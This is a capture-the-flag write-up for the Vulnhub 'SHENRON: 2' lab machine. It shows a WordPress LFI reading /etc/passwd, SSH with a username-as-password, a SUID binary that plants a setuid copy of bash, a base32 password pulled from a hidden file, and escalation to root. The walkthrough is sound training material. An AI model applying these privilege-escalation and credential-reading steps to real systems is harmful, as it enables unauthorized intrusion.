## SHENRON: 2
This is [SHENRON: 2](https://www.vulnhub.com/entry/shenron-2,677/) from Vulnhub. It says difficulty is 'beginner'. It took me about an hour.

## Ports
SSH on 22, plus HTTP on ports 80 and 8080 - hey, that's a lot like the last one!

## HTTP/80
Looks to be a pretty basic template page with nothing juicy. Moving on...

## HTTP/8080
Wordpress. I add *shenron* to /etc/hosts and run wpscan; trivial password hmmm.

Okay well that was easy, now what? We can't upload a plugin (can't copy it to the destination directory), and we can't edit the templates (all set as non-writeable). There are several non-standard plugins installed, being:

>Classic Editor  
>Elementor, and  
>Site Editor

Checking out searchsploit reveals issues with Site Editor and Elementor, but for the version we have it's only *Site Editor*, which has an [LFI](https://www.exploit-db.com/exploits/44340) vulnerability. I check /etc/passwd first and then look for SSH keys, nope. Can't read any logs, no /proc/self/environ, can't read wp-config. I run Turbo Intruder with a nice big list of files and get plenty of hits but nothing that will leverage into RCE. Now what - this was supposed to be beginner level?

Well, we've got two users - Jenny and Shenron. Surely we can't just SSH in with the username as the password?

{% highlight shell %}

â””â”€# ssh jenny@192.168.1.197                                                                                                          130 â¨¯

Oh wait yes we can. Not sure how I feel about this. Anyway....

## Shenron
Well, there's nothing useful in wp-config.php anyway. Linpeas doesn't highlight it, but it does find a non-standard SUID binary:

>-rwsr-xr-x 1 root root             17K Apr  6 00:36 /usr/bin/Execute

I wonder what it does?

{% highlight shell %}
jenny@shenron-2:/dev/shm$ file /usr/bin/Execute
/usr/bin/Execute: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=cedff63201c18a7326f645ca521f0d47eb0b85b7, for GNU/Linux 3.2.0, not stripped
jenny@shenron-2:/dev/shm$ strings /usr/bin/Execute

Command 'strings' not found, but can be installed with:

apt install binutils
Please ask your administrator.

jenny@shenron-2:/dev/shm$ /usr/bin/Execute
jenny@shenron-2:/dev/shm$ id
uid=1001(jenny) gid=1001(jenny) groups=1001(jenny)
{% endhighlight %}

So ... nothing? Nah, can't be right.

{% highlight shell %}
â”€â”€(rootðŸ’€kali)-[/opt/vulnhub/shenron2]
â””â”€# scp jenny@192.168.1.197:/usr/bin/Execute execute 
# etc
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/vulnhub/shenron2]
â””â”€# strings execute 
# etc
/usr/bin/cp /bin/bash /mnt/bash; /usr/bin/chmod 777 /mnt/bash; /usr/bin/chown shenron:shenron /mnt/bash; /usr/bin/chmod u+s /mnt/bash
# much more etc
{% endhighlight %}

Right. So, it's making a copy of /bin/bash, putting it in /mnt/bash and adding the SUID bit. So if we do this:

{% highlight shell %}
jenny@shenron-2:/dev/shm$ id
uid=1001(jenny) gid=1001(jenny) groups=1001(jenny)
jenny@shenron-2:/dev/shm$ /mnt/bash -p
bash-5.0$ id
uid=1001(jenny) gid=1001(jenny) euid=1000(shenron) groups=1001(jenny)
{% endhighlight %}

We get a new EUID.

## Root
With out newfound powers of EUID we can do some more enumeration and find (and read) a file owned by Shenron:

{% highlight shell %}
bash-5.0$ ls -lash
total 16K
4.0K drwx------  2 shenron shenron 4.0K Apr  5 19:13 .
4.0K drwxr-xr-x 16 shenron shenron 4.0K Apr  6 00:43 ..
4.0K -rwx------  1 shenron shenron   32 Apr  5 19:13 local.txt
4.0K -rwx------  1 shenron shenron   97 Apr  5 19:10 .pass
{% endhighlight %}

This contains his password, base32 encoded:

>bash-5.0$ cat .pass  
KNUEK3SSN5HFG2CFNZJG6TSTNBCW4UTPJZJWQRLOKJXU4U3IIVXFE32OIBJWQRLOKJXU4I2TNBCW4UTPJZIGCU3TK5XVEZAK

Which is:

>ShEnRoNShEnRoNShEnRoNShEnRoNShEnRoN@ShEnRoN#ShEnRoNPaSsWoRd  

And since *shenron* is in the sudoers group, we're done:

{% highlight shell %}
bash-5.0$ su shenron
Password: 
shenron@shenron-2:~/Desktop$ sudo su
[sudo] password for shenron: 
root@shenron-2:/home/shenron/Desktop# cd /root
root@shenron-2:~# id;hostname;date
uid=0(root) gid=0(root) groups=0(root)
shenron-2
Monday 12 April 2021 06:21:49 PM IST
root@shenron-2:~#
{% endhighlight %}

And now it's bedtime.
